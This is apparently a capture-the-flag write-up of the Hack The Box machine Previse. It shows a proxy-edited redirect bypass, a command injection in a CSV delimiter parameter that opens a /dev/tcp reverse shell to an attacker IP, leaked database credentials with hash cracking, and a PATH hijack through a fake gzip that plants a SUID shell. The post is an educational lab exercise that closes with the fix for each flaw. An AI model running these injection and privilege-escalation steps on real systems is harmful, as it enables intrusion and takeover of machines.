---
layout: post
title: "The Page That Forgot to Stop"
subtitle: "HTB Previse, where a redirect with no exit hands you a page you were never logged in to see, a backup zip spills the source, and a missing path lets a fake gzip wear root's crown"
date: 2022-01-15 12:00:00 +0000
description: "A login check that sends you away but renders the page anyway, a leaked source zip, and a sudo script that trusts whatever gzip it finds first."
image: /assets/og/the-page-that-forgot-to-stop.png
tags: [hackthebox, writeup]
---

Previse is a box about the difference between telling someone to leave and actually making them leave. The site checks whether you are logged in, decides you are not, and politely sends you a redirect toward the login page. Then it builds the whole protected page anyway and ships it to you in the same breath. The redirect was a suggestion. The page was the prize. From there it is a short walk: a backup zip hands you the source, the source confesses a command injection, the database hands you a hash, the hash cracks, and a sudo script trusts whatever program named gzip it happens to bump into first. Nobody overpowers anything here. Every door was unlocked by someone who thought saying "go away" was the same as closing it.

```
        P R E V I S E
        =============
        GET /accounts.php
          server:  302 -> go to login.php
          server:  ...and here is the full page anyway
                          |
                          v
        the bouncer points at the exit
        and hands you the VIP list on the way out.

        make an account. download the backup.
        read your own future in the source.
                                            預
```

## 0x01 · the two-port porch

`nmap` comes back almost insultingly short. A web server and a way in over SSH, nothing else.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
```

OpenSSH 7.6 and Apache 2.4.29 both put us on Ubuntu 18.04, recent enough that the kernel is not going to be the soft spot. When a box gives you two ports and one of them is a login you have no key for, the whole game lives on port 80. So we point the browser at the site and start reading.

The app is an admin panel for some internal log tool. It wants a login. Browse to anything interesting, `accounts.php` or `files.php`, and the server bounces you back to `login.php` before you can blink. That bounce is the entire box, and it is lying to you.

## 0x02 · the redirect that kept talking

The flaw here has a tidy name: Execute After Redirect, or EAR. Picture a security guard who sees you wander toward the staff-only room, says "sorry, you can't be back here, please head to the front desk," and then, while still talking, holds the door open and lets you walk straight in. The words said no. The body said yes. The browser obeys the words because it is polite. The server already did the part that matters.

In PHP it looks like this. The page checks your session, decides you are not allowed, and fires off a redirect header.

```php
if (!isset($_SESSION['user'])) {
    header('Location: login.php');
    // and then... nothing. no exit;
}
// the rest of the page renders right here, every time
```

That missing `exit;` is the whole wound. `header('Location: ...')` only sets a response header. It does not stop the script. PHP keeps running, builds the protected HTML, and sends it after the redirect line. Your browser sees the 302, throws the body away, and skips to the login page like a good citizen. But the body was already sent over the wire. So you stop being a good citizen. Catch the response in a proxy, change the `302 Found` status line to `200 OK`, and let the browser keep the page it was told to discard.

```
# in your intercepting proxy, edit the server response:
HTTP/1.1 302 Found      ->      HTTP/1.1 200 OK
Location: login.php             (delete this line)
```

Suddenly every "protected" page renders. The most useful one is `accounts.php`, which holds the create-a-user form. Normally only a logged-in admin reaches it. But reaching it was never the gate, and the form on the other side does not double-check who is asking. So you submit the account creation request straight at it.

```
POST /accounts.php HTTP/1.1
Host: 10.10.11.104
Content-Type: application/x-www-form-urlencoded

username=iceberg&password=password123&confirm=password123
```

Now you have a real account. Log in the normal way, no proxy tricks, and the whole panel opens like you belong there. You do, now. You made yourself a key by walking through a door that was never locked.

## 0x03 · the backup that spilled the blueprints

Logged in, `files.php` lists uploads, and sitting in the pile is a file named `SITEBACKUP.ZIP`. Someone backed up the entire web root and left it on the very site it came from. Download it, unzip it, and you are holding the full PHP source of the application you are attacking. Think of it like a bank leaving a copy of its own floor plans, vault timings, and key-cutting notes in the lobby suggestion box. You no longer have to guess where anything is. You can read where the soft spots are written down.

The file worth reading is `logs.php`. It powers the "download logs as CSV" feature, where you pick a delimiter (comma, space, tab) and it hands you a file. Here is the line that ends the box.

```php
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
```

Read it slowly. Your `delim` value gets dropped into a string, and that whole string gets handed to `exec`, which runs it as a shell command. Nothing checks that `delim` is actually one of comma, space, or tab. It is supposed to be a setting. It becomes part of a command, which is the same disease that has powered every injection bug since the dawn of time: a program took something a stranger typed and treated part of it as an instruction instead of inert data.

## 0x04 · the delimiter that was a command

So you stop sending a delimiter and start sending a sentence the shell will obey. The trick is to let the intended part run, then chain your own command after it with a semicolon, and comment out whatever trails behind.

```
POST /logs.php
delim=comma; [ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ] #
```

The semicolon ends the legitimate `log_process.py` call. Your command runs next. The `#` swallows the rest of the line so nothing downstream complains. Start a listener, submit the request, and a shell drops in wearing the web server's clothes.

```
# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.104]
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`www-data` is a nobody account, but it is a nobody who lives inside the application, and the application keeps its secrets close.

## 0x05 · the database that kept the keys

The source already told you where the database password lives. `config.php` keeps the MySQL credentials in plain text, the way config files always do.

```php
$conn = mysqli_connect('localhost','root','mySQL_p@ssw0rd!:)','previse');
```

Log into MySQL with that and dump the `accounts` table. Out fall the user hashes.

```
$ mysql -u root -p'mySQL_p@ssw0rd!:)' previse -e 'select username,password from accounts;'
username   password
m4lwhere   $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
```

That `$1$` prefix is the tell. It is MD5-crypt, an old salted password format, and the salt is sitting right there in the string (yes, the developer used a salt-shaker emoji as part of the salt, which is the most 2021 thing about this whole box). A salted hash means you cannot use a precomputed rainbow table, but it does nothing to stop a plain guess-and-check against a wordlist. Picture a lock where you can try keys as fast as you want but each guess takes a full second to turn. Slow you down, sure. Stop you, no, not when the password is in everyone's favorite leaked list.

```
$ hashcat -m 500 m4lwhere.hash rockyou.txt
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
```

The password is `ilovecody112235!`, and the filename of the box's intended user, `m4lwhere`, is hiding in the username column. SSH straight in.

```
$ ssh m4lwhere@10.10.11.104
m4lwhere@previse:~$ cat user.txt
████████████████████████████████
```

## 0x06 · the gzip that wasn't

Ask the box what `m4lwhere` is allowed to run as root, and it answers with exactly one thing.

```
m4lwhere@previse:~$ sudo -l
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```

Read the script and the hole is obvious.

```bash
#!/bin/bash
gzip -c /var/log/apache2/access.log  > /var/backups/$(date ...)_access.gz
gzip -c /var/www/file_access.log     > /var/backups/$(date ...)_file_access.gz
```

It calls `gzip`. Not `/bin/gzip`. Just `gzip`. When you type a bare program name, the shell hunts for it by walking a list of folders called `PATH`, in order, and runs the first match it finds. Normally `gzip` lives in `/bin` and that is the end of it. But this script runs as root through sudo, and the sudoers config here never set `secure_path`, the safety rail that forces sudo to use a known, trusted PATH. So the script will happily search whatever PATH you hand it.

Think of it like a contractor with a work order that just says "go get the drill." If you control which toolbox he opens first, you decide what "the drill" is. Drop your own thing labeled drill in the box he checks first, and he carries your thing to the job, with the boss's authority.

So you write a fake `gzip`, put its folder at the front of PATH, and let the root script find yours before the real one.

```
m4lwhere@previse:~$ cd /dev/shm
m4lwhere@previse:/dev/shm$ printf '#!/bin/bash\ncp /bin/bash /tmp/iceberg\nchmod 4755 /tmp/iceberg\n' > gzip
m4lwhere@previse:/dev/shm$ chmod +x gzip
m4lwhere@previse:/dev/shm$ export PATH=/dev/shm:$PATH
m4lwhere@previse:/dev/shm$ sudo /opt/scripts/access_backup.sh
```

The script runs as root, reaches for `gzip`, finds yours first, and runs it as root. Mine copies the shell, marks it SUID so it keeps root's identity when launched, and parks it in `/tmp`. Now collect the crown.

```
m4lwhere@previse:/dev/shm$ /tmp/iceberg -p
iceberg-5.4# id
uid=1000(m4lwhere) gid=1000(m4lwhere) euid=0(root)
iceberg-5.4# cat /root/root.txt
████████████████████████████████
```

## 0x07 · the honest caveat

Previse is easy, but easy is not the same as unrealistic. Every link in this chain is a thing real applications do every day.

The EAR bug is the one I would lose sleep over, because it ships green. Nothing is unpatched. No CVE has your name on it. A developer wrote an access check, saw it redirect in the browser, watched it bounce them to the login page, and called it done. The check looked like it worked because the browser was kind enough to hide the failure. That is the trap of testing security by clicking around in a browser. The browser obeys redirects. An attacker with a proxy simply does not. A redirect is a request to leave, and a request is not a wall. If the secret has already left the server, telling the browser to look away changes nothing.

The rest stacks on the oldest mistakes there are. The backup zip is what happens when convenience outranks paranoia, one file that turns "guess the internals" into "read the internals." The command injection is the same data-becomes-instruction confusion that the whole industry keeps rebuilding in new costumes. The PATH hijack is a root program trusting its surroundings, asking for a tool by name and trusting the room to hand it the right one. Each fix is one line. Add the `exit;`. Delete the backup. Validate the delimiter. Pin the absolute path or set `secure_path`. None of it is hard. All of it got skipped because each gap, on its own, looked like nothing.

## 0x08 · outro

```
the guard said leave and held the door at the same time.
the backup zip read you the floor plan out loud.
a delimiter turned into a command because nobody drew the line.
and a root script trusted the first tool it tripped over.

four small "it's fine"s, stacked into a clean run to root.
none of them were exploits. all of them were habits.

add the exit. pin the path. wear black.

                                                            EOF
```

---

*HTB: Previse, retired 8 Jan 2022. An easy Linux box that is really a lecture on the gap between saying no and meaning it. A redirect with no exit is a locked door propped open with a sticky note that reads keep out.*